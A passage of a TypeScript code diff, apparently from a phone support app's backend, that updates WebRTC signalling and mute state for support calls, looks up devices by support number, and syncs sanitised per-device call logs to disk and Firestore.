+  const patch: Record<string, unknown> = {
+    updatedAtMs: nowMs,
+    updatedAt: new Date(nowMs),
+  };
+  if (current.status === 'active') {
+    patch.expiresAtMs = nowMs + 30 * 60_000;
+  }
+
+  let nextRtcSeq = current.rtcSeq || 0;
+  let nextOffer = current.rtcOffer || '';
+  let nextAnswer = current.rtcAnswer || '';
+  let nextCallerMuted = Boolean(current.callerMicMuted);
+  let nextSupportMuted = Boolean(current.supportMicMuted);
+
+  if (signal.role === 'caller') {
+    if (typeof signal.rtcOffer === 'string' && signal.rtcOffer.trim()) {
+      nextRtcSeq =
+        typeof signal.rtcSeq === 'number' && Number.isFinite(signal.rtcSeq)
+          ? Math.max(nextRtcSeq + 1, Math.round(signal.rtcSeq))
+          : nextRtcSeq + 1;
+      nextOffer = sanitizeSdpJson(signal.rtcOffer);
+      nextAnswer = '';
+      patch.rtcSeq = nextRtcSeq;
+      patch.rtcOffer = nextOffer;
+      patch.rtcAnswer = '';
+    }
+    if (typeof signal.callerMicMuted === 'boolean') {
+      nextCallerMuted = signal.callerMicMuted;
+      patch.callerMicMuted = nextCallerMuted;
+    }
+  } else {
+    if (typeof signal.rtcAnswer === 'string' && signal.rtcAnswer.trim()) {
+      const targetSeq =
+        typeof signal.rtcSeq === 'number' && Number.isFinite(signal.rtcSeq)
+          ? Math.round(signal.rtcSeq)
+          : nextRtcSeq;
+      if (targetSeq >= nextRtcSeq) {
+        nextAnswer = sanitizeSdpJson(signal.rtcAnswer);
+        patch.rtcAnswer = nextAnswer;
+      }
+    }
+    if (typeof signal.supportMicMuted === 'boolean') {
+      nextSupportMuted = signal.supportMicMuted;
+      patch.supportMicMuted = nextSupportMuted;
+    }
+  }
+
+  const next: SupportCallSession = {
+    ...current,
+    rtcSeq: nextRtcSeq,
+    rtcOffer: nextOffer,
+    rtcAnswer: nextAnswer,
+    callerMicMuted: nextCallerMuted,
+    supportMicMuted: nextSupportMuted,
+    expiresAtMs: current.status === 'active' ? nowMs + 30 * 60_000 : current.expiresAtMs,
+    updatedAtMs: nowMs,
+  };
+
+  state.supportCalls.set(callId, next);
+  saveToDisk();
+  await fsPatchFields('support_calls', next.callId, patch).catch(async () => {
+    await saveSupportCallToFirestore(next);
+  });
+  return next;
+}
+
+// ---------- Device Support Directory (69xxxx) & Synced Call Logs ----------
+
+export async function listSupportDevices(forceSync = true): Promise<DeviceClient[]> {
+  const snap = await getOwnerDashboardSnapshot(forceSync);
+  return snap.devices;
+}
+
+export async function findDeviceBySupportNumber(rawCode: string): Promise<DeviceClient | null> {
+  const clean = String(rawCode || '').replace(/\s+/g, '').trim();
+  if (!isValidSupportNumber(clean)) return null;
+  const devices = await listSupportDevices(true);
+  return devices.find((d) => String(d.supportNumber || '').trim() === clean) || null;
+}
+
+export async function saveDeviceCallLogs(
+  deviceIdInput: string,
+  rawLogs: DialerCallLogEntry[]
+): Promise<DialerCallLogEntry[]> {
+  loadFromDisk();
+  const deviceId = sanitizeId(deviceIdInput);
+  const nowMs = Date.now();
+  const validTypes = new Set(['incoming', 'outgoing', 'missed', 'rejected', 'blocked']);
+  const seen = new Set<string>();
+  const cleaned: DialerCallLogEntry[] = [];
+
+  for (const item of Array.isArray(rawLogs) ? rawLogs : []) {
+    if (!item || typeof item !== 'object') continue;
+    const number = clampStr(item.number, 48, '');
+    if (!number) continue;
+    const name = clampStr(item.name, 80, '');
+    const dateMs = Math.max(0, Math.round(safeNum(item.dateMs, nowMs)));
+    const durationSec = Math.max(0, Math.min(86400, Math.round(safeNum(item.durationSec, 0))));
+    const type = validTypes.has(String(item.type))
+      ? (String(item.type) as DialerCallLogEntry['type'])
+      : 'incoming';
+    const id = clampStr(item.id, 64, `${dateMs}_${number}`);
+    if (seen.has(id)) continue;
+    seen.add(id);
+    cleaned.push({ id, number, name, type, dateMs, durationSec });
+    if (cleaned.length >= 150) break;
+  }
+
+  cleaned.sort((a, b) => b.dateMs - a.dateMs);
+  state.deviceCallLogs.set(deviceId, cleaned);
+  saveToDisk();
+
+  let logsJson = JSON.stringify(cleaned);
+  while (logsJson.length > 30_000 && cleaned.length > 0) {
+    cleaned.pop();
+    logsJson = JSON.stringify(cleaned);
+  }
+
+  await fsSetDocument('device_call_logs', deviceId, {
+    batchId: deviceId,
+    deviceId,
+    logsJson,
+    count: cleaned.length,
+    updatedAtMs: nowMs,
+    ownerId: SYSTEM_OWNER_ID,
+    createdAt: new Date(nowMs),
+    updatedAt: new Date(nowMs),
+  }).catch(() => {});
+
+  return cleaned;
+}
+
+export async function getDeviceCallLogs(deviceIdInput: string): Promise<DialerCallLogEntry[]> {
+  loadFromDisk();
+  const deviceId = sanitizeId(deviceIdInput);
+  const fsDoc = await fsGetDocument<Record<string, unknown>>('device_call_logs', deviceId).catch(() => null);
+  if (fsDoc && typeof fsDoc.logsJson === 'string') {
+    try {
+      const parsed = JSON.parse(fsDoc.logsJson);
+      if (Array.isArray(parsed)) {
+        state.deviceCallLogs.set(deviceId, parsed as DialerCallLogEntry[]);
+        saveToDisk();
+        return parsed as DialerCallLogEntry[];
+      }
+    } catch {}
+  }
+  return state.deviceCallLogs.get(deviceId) || [];
+}
+
+
 
 
